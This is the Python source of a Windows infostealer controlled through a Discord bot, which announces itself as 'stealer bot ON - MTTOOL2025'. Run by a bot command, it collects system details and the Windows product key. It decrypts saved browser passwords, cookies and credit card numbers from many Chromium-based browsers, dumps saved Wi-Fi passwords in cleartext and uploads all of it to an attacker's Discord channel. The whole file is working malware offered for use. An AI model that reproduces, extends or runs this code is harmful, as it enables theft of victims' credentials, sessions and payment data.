import os
import sqlite3
import json
import base64
import shutil
import requests
from Crypto.Cipher import AES
import win32crypt
import zipfile
import io
import time
import discord
from discord.ext import commands
import asyncio
import concurrent.futures

# Discord bot setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='?', intents=intents)

# THAY TOKEN CỦA BẠN VÀO ĐÂY
DISCORD_BOT_TOKEN = 'YOUR DISCORD BOT TOKEN'

import subprocess
import psutil
from screeninfo import get_monitors
import pycountry

class PcInfo:
    def __init__(self, channel):
        self.channel = channel
        self.loop = asyncio.get_event_loop()

    async def run(self):
        await self.get_system_info()

    def get_country_code(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return str(country.alpha_2).lower()
        except LookupError:
            return "unknown"

    def get_all_avs(self) -> str:
        try:
            process = subprocess.run(
                "Get-WmiObject -Namespace 'Root\\SecurityCenter2' -Class AntivirusProduct | Select-Object displayName",
                shell=True, capture_output=True, text=True
            )
            if process.returncode == 0:
                output = process.stdout.strip().splitlines()
                if len(output) >= 2:
                    av_list = [av.strip() for av in output[1:] if av.strip()]
                    return ", ".join(av_list)
            return "No antivirus found"
        except Exception as e:
            print(f"Error getting antivirus: {e}")
            return "Error retrieving antivirus information"

    def get_screen_resolution(self):
        try:
            monitors = get_monitors()
            resolutions = [f"{monitor.width}x{monitor.height}" for monitor in monitors]
            return ', '.join(resolutions) if resolutions else "Unknown"
        except Exception as e:
            print(f"Error getting screen resolution: {e}")
            return "Unknown"

    async def get_system_info(self):
        try:
            with concurrent.futures.ThreadPoolExecutor() as pool:
                computer_os = await self.loop.run_in_executor(pool, lambda: subprocess.run(
                    'powershell -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"', 
                    capture_output=True, shell=True, text=True
                ))
                computer_os = computer_os.stdout.strip() if computer_os.returncode == 0 else "Unknown"
                
                cpu = await self.loop.run_in_executor(pool, lambda: subprocess.run(
                    'powershell -Command "(Get-CimInstance -ClassName Win32_Processor).Name"', 
                    capture_output=True, shell=True, text=True
                ))
                cpu = cpu.stdout.strip() if cpu.returncode == 0 else "Unknown"
                
                gpu = await self.loop.run_in_executor(pool, lambda: subprocess.run(
                    'powershell -Command "(Get-CimInstance -ClassName Win32_VideoController).Name"', 
                    capture_output=True, shell=True, text=True
                ))
                gpu = gpu.stdout.strip() if gpu.returncode == 0 else "Unknown"
                
                ram = await self.loop.run_in_executor(pool, lambda: subprocess.run(
                    'powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"', 
                    capture_output=True, shell=True, text=True
                ))
                ram = str(round(int(ram.stdout.strip()) / (1024 ** 3))) if ram.returncode == 0 else "Unknown"
                
                model = await self.loop.run_in_executor(pool, lambda: subprocess.run(
                    'powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"', 
                    capture_output=True, shell=True, text=True
                ))
                model = model.stdout.strip() if model.returncode == 0 else "Unknown"
                
                uuid = await self.loop.run_in_executor(pool, lambda: subprocess.run(
                    'powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"', 
                    capture_output=True, shell=True, text=True
                ))
                uuid = uuid.stdout.strip() if uuid.returncode == 0 else "Unknown"
                
                product_key = await self.loop.run_in_executor(pool, lambda: subprocess.run(
                    'powershell -Command "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"', 
                    capture_output=True, shell=True, text=True
                ))
                product_key = product_key.stdout.strip() if product_key.returncode == 0 and product_key.stdout.strip() != "" else "Failed to get product key"

            username = os.getenv("UserName")
            hostname = os.getenv("COMPUTERNAME")
            
            try:
                r = requests.get("http://ip-api.com/json/?fields=225545", timeout=10).json()
                country = r.get("country", "Unknown")
                proxy = r.get("proxy", False)
                ip = r.get("query", "Unknown")
            except:
                country = "Unknown"
                proxy = False
                ip = "Unknown"

            _, addrs = next(iter(psutil.net_if_addrs().items()))
            mac = addrs[0].address
            screen_resolution = self.get_screen_resolution()

            message = f'''
**PC Username:** `{username}`
**PC Name:** `{hostname}`
**Model:** `{model if model else "Unknown"}`
**Screen Resolution:** `{screen_resolution}`
**OS:** `{computer_os}`
**Product Key:** `{product_key}`\n
**IP:** `{ip}`
**Country:** `{country}`
**Proxy:** `{"Yes" if proxy else "No"}`
**MAC:** `{mac}`
**UUID:** `{uuid}`\n
**CPU:** `{cpu}`
**GPU:** `{gpu}`
**RAM:** `{ram}GB`\n
**Antivirus:** `{self.get_all_avs()}`'''

            tasklist = subprocess.run("tasklist", capture_output=True, shell=True, text=True)
            tasklist_output = tasklist.stdout.strip()

            installed_apps = subprocess.run("wmic product get name", capture_output=True, shell=True, text=True)
            installed_apps_output = installed_apps.stdout.strip()

            log_file = "tasklist.txt"
            with open(log_file, 'w', encoding='utf-8') as f: 
                f.write("Danh sách ứng dụng đang chạy:\n")
                f.write(tasklist_output)
                f.write("\n\nDanh sách phần mềm đã cài đặt:\n")
                f.write(installed_apps_output)
            
            await self.send_message_to_discord(message)
            await self.send_file_to_discord(log_file)
            os.remove(log_file)
            print(f"Tệp {log_file} đã được xóa.")

        except Exception as e:
            await self.send_message_to_discord(f"Error occurred: {str(e)}")
            print(f"Error occurred: {str(e)}")

    async def send_message_to_discord(self, message: str):
        try:
            if len(message) > 2000:
                chunks = [message[i:i+2000] for i in range(0, len(message), 2000)]
                for chunk in chunks:
                    await self.channel.send(f"```{chunk}```")
                    await asyncio.sleep(1)
            else:
                await self.channel.send(f"```{message}```")
            print("Gửi thông điệp thành công")
        except Exception as e:
            print(f"Lỗi khi gửi thông điệp: {e}")

    async def send_file_to_discord(self, file_path: str):
        try:
            with open(file_path, 'rb') as file:
                await self.channel.send(file=discord.File(file, filename=os.path.basename(file_path)))
            print("Gửi tệp thành công")
        except Exception as e:
            print(f"Lỗi khi gửi tệp: {e}")


class Browser:
    def __init__(self, channel):
        self.channel = channel
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

    async def run(self):
        await asyncio.get_event_loop().run_in_executor(None, self.create_zip_file)
        await self.send_file_to_discord("password_full.zip")
        os.remove("password_full.zip")

    def get_encryption_key(self, browser_path):
        local_state_path = os.path.join(browser_path, 'Local State')
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state_data = json.load(f)

        encrypted_key = base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  

        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return key

    def decrypt_password(self, encrypted_password, key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(payload)[:-16].decode()
            return decrypted_password
        except Exception as e:
            return None

    def extract_passwords(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                login_db_path = os.path.join(browser_path, profile, 'Login Data')
                if not os.path.exists(login_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_LoginData.db")
                shutil.copyfile(login_db_path, tmp_db_path)

                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    key = self.get_encryption_key(browser_path)
                    if not key:
                        continue

                    password_data = io.StringIO()
                    password_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    password_data.write("=" * 120 + "\n")
                    password_data.write(f"{'Website':<60} | {'Username':<30} | {'Password':<30}\n")
                    password_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        origin_url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        decrypted_password = self.decrypt_password(encrypted_password, key)

                        if username and decrypted_password:
                            password_data.write(f"{origin_url:<60} | {username:<30} | {decrypted_password:<30}\n")

                    password_data.write("\n")  
                    
                    zip_file.writestr(f"browser/{browser}_passwords_{profile}.txt", password_data.getvalue())

                except Exception as e:
                    print(f"Error extracting from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def extract_history(self, zip_file):
        for browser, browser_path in self.browser.items():
            if not os.path.exists(browser_path):
                continue

            for profile in self.profiles:
                history_db_path = os.path.join(browser_path, profile, 'History')
                if not os.path.exists(history_db_path):
                    continue

                tmp_db_path = os.path.join(os.getenv("TEMP"), f"{browser}_{profile}_History.db")
                try:
                    shutil.copyfile(history_db_path, tmp_db_path)
                except PermissionError:
                    print(f"Không thể sao chép tệp {history_db_path}. Có thể tệp đang được sử dụng.")
                    continue  
                conn = sqlite3.connect(tmp_db_path)
                cursor = conn.cursor()

                try:
                    cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")

                    history_data = io.StringIO()
                    history_data.write(f"Browser: {browser} | Profile: {profile}\n")
                    history_data.write("=" * 120 + "\n")
                    history_data.write(f"{'URL':<80} | {'Title':<30} | {'Visit Count':<10} | {'Last Visit Time'}\n")
                    history_data.write("=" * 120 + "\n")

                    for row in cursor.fetchall():
                        url = row[0]
                        title = row[1]
                        visit_count = row[2]
                        last_visit_time = row[3]

                        history_data.write(f"{url:<80} | {title:<30} | {visit_count:<10} | {last_visit_time}\n")

                    history_data.write("\n") 
                    
                    zip_file.writestr(f"browser/{browser}_history_{profile}.txt", history_data.getvalue())

                except Exception as e:
                    print(f"Error extracting history from {browser}: {e}")

                cursor.close()
                conn.close()
                os.remove(tmp_db_path)

    def create_zip_file(self):
        with zipfile.ZipFile("password_full.zip", "w") as zip_file:
            self.extract_passwords(zip_file)
            self.extract_history(zip_file)

    async def send_file_to_discord(self, file_path: str):
        try:
            with open(file_path, 'rb') as file:
                await self.channel.send(file=discord.File(file, filename=os.path.basename(file_path)))
            print("Gửi tệp thành công")
        except Exception as e:
            print(f"Lỗi khi gửi tệp: {e}")


import base64
import json
import random
import threading
from win32crypt import CryptUnprotectData

class Browsers:
    def __init__(self, channel):
        self.channel = channel
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
        os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)

    async def run(self):
        await asyncio.get_event_loop().run_in_executor(None, self.process_browsers)

    def process_browsers(self):
        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.passwords,
                self.credit_cards
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.create_zip_and_send()

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return ""

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(self.temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = self.create_temp()
        shutil.copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(self.temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
        os.remove(cookievault)

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(self.temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(self.temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

    def create_zip_and_send(self):
        file_paths = [
            os.path.join(self.temp_path, "Browser", "passwords.txt"),
            os.path.join(self.temp_path, "Browser", "cookies.txt"),
            os.path.join(self.temp_path, "Browser", "history.txt"),
            os.path.join(self.temp_path, "Browser", "cc's.txt")
        ]
        zip_file_path = os.path.join(self.temp_path, "BrowserData.zip")
        self.create_zip(file_paths, zip_file_path)
        asyncio.run_coroutine_threadsafe(self.send_file_to_discord(zip_file_path), asyncio.get_event_loop())

        for file in file_paths:
            if os.path.isfile(file):
                os.remove(file)
        if os.path.isfile(zip_file_path):
            os.remove(zip_file_path)

    def create_zip(self, file_paths: list, zip_path: str):
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for file in file_paths:
                if os.path.isfile(file):
                    zipf.write(file, os.path.basename(file))

    async def send_file_to_discord(self, file_path: str):
        try:
            with open(file_path, 'rb') as file:
                await self.channel.send(file=discord.File(file, filename=os.path.basename(file_path)))
            print("Gửi tệp thành công")
        except Exception as e:
            print(f"Lỗi khi gửi tệp: {e}")

    def create_temp(self, _dir = None):
        if _dir is None:
            _dir = os.path.expanduser("~/tmp")
        if not os.path.exists(_dir):
            os.makedirs(_dir)
        file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = os.path.join(_dir, file_name)
        open(path, "x").close()
        return path


import subprocess
import re

class Wifi:
    def __init__(self, channel):
        self.channel = channel
        self.networks = {}

    async def run(self):
        await asyncio.get_event_loop().run_in_executor(None, self.get_networks)
        await self.send_info_to_discord()

    def get_networks(self):
        output_networks = self.run_command(["netsh", "wlan", "show", "profiles"])
        if "Error" in output_networks:
            print("Error in getting Wi-Fi profiles:", output_networks)
            return  
        
        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profile" in line]
        if not profiles:
            print("No Wi-Fi profiles found.")
        
        for profile in profiles:
            if profile:
                profile_info = self.run_command(["netsh", "wlan", "show", "profile", profile, "key=clear"])
                self.networks[profile] = self.extract_password(profile_info)

    def run_command(self, command, encoding='utf-8'):
        try:
            result = subprocess.run(command, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            return result.stdout.strip()
        except subprocess.CalledProcessError as e:
            print(f"Error executing command {command}: {e}")
            return f"Error: {e}"

    def extract_password(self, profile_info):
        match = re.search(r"Key Content\s*:\s*(.+)", profile_info)
        return match.group(1).strip() if match else "No password found"

    def get_router_ip(self):
        output = self.run_command("ipconfig")
        if "Error" in output:
            print("Error in getting router IP:", output)
            return "Failed to get router IP"
        
        router_ip = None
        is_eth = False  
        for line in output.splitlines():
            if "Ethernet adapter" in line:  
                is_eth = True
            elif is_eth and "Default Gateway" in line:
                router_ip = line.split(":")[1].strip()
                break
        
        if not router_ip:
            print("Failed to get router IP from LAN.")
        return router_ip if router_ip else "Failed to get router IP"

    def get_mac_address(self):
        router_ip = self.get_router_ip()
        if router_ip == "Failed to get router IP":
            return "Failed to get MAC address"
        
        self.run_command(f"ping -n 1 {router_ip}")  
        output = self.run_command(f"arp -a {router_ip}")
        if "Error" in output:
            print("Error in getting MAC address:", output)
            return "MAC address not found"
        
        mac_address_match = re.search(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", output)
        return mac_address_match.group() if mac_address_match else "MAC address not found"

    def get_vendor_info(self, mac_address):
        try:
            url = f"https://api.macvendors.com/{mac_address}"
            response = requests.get(url)
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to get vendor info. Status code: {response.status_code}")
                return "Vendor info not found"
        except requests.RequestException as e:
            print(f"Error in getting vendor info: {e}")
            return f"Error: {e}"

    async def send_info_to_discord(self):
        router_ip = self.get_router_ip()
        mac_address = self.get_mac_address()
        vendor_info = self.get_vendor_info(mac_address)
        
        message = f'''
**Router IP Address:** `{router_ip}`
**Router MAC Address:** `{mac_address}`
**Router Vendor:** `{vendor_info}`
**Saved Wi-Fi Networks:**
'''
        if self.networks:
            for network, password in self.networks.items():
                message += f"- `{network}`: `{password}`\n"
        else:
            message += "No Wi-Fi networks found."
        
        await self.send_message_to_discord(message)

    async def send_message_to_discord(self, message: str):
        try:
            if len(message) > 2000:
                chunks = [message[i:i+2000] for i in range(0, len(message), 2000)]
                for chunk in chunks:
                    await self.channel.send(f"```{chunk}```")
                    await asyncio.sleep(1)
            else:
                await self.channel.send(f"```{message}```")
            print("Message sent successfully")
        except Exception as e:
            print(f"Error sending message: {e}")

@bot.event
@bot.event
async def on_ready():
    # In thông báo xác nhận bot đã sẵn sàng vào console
    print(f'Bot {bot.user} đã sẵn sàng!')
    
    # ID kênh bạn muốn gửi tin nhắn đến - THAY BẰNG ID CỦA BẠN NẾU CẦN
    channel_id = YOUR_CHANNEL_ID
    
    # Lấy đối tượng kênh từ ID
    channel = bot.get_channel(channel_id)
    
    # Kiểm tra xem có tìm thấy kênh không
    if channel is None:
        print(f"Không thể tìm thấy kênh với ID: {channel_id}. Vui lòng kiểm tra lại ID và quyền của bot.")
        return
    
    try:
        # Gửi tin nhắn đến kênh
        await channel.send("stealer bot ON - MTTOOL2025")
        print(f"Đã gửi tin nhắn khởi động đến kênh #{channel.name}")
    except Exception as e:
        print(f"Lỗi khi gửi tin nhắn: {e}")

@bot.command()
async def stealer1(ctx):
    await ctx.send("Đang thu thập thông tin...")
    
    try:
        pc_info = PcInfo(ctx.channel)
        await pc_info.run()
        
        browser = Browser(ctx.channel)
        await browser.run()
        
        browsers = Browsers(ctx.channel)
        await browsers.run()
        
        wifi = Wifi(ctx.channel)
        await wifi.run()
        
        await ctx.send("Hoàn thành thu thập thông tin!")
    except Exception as e:
        await ctx.send(f"Lỗi xảy ra: {str(e)}")

if __name__ == "__main__":
    bot.run(DISCORD_BOT_TOKEN)
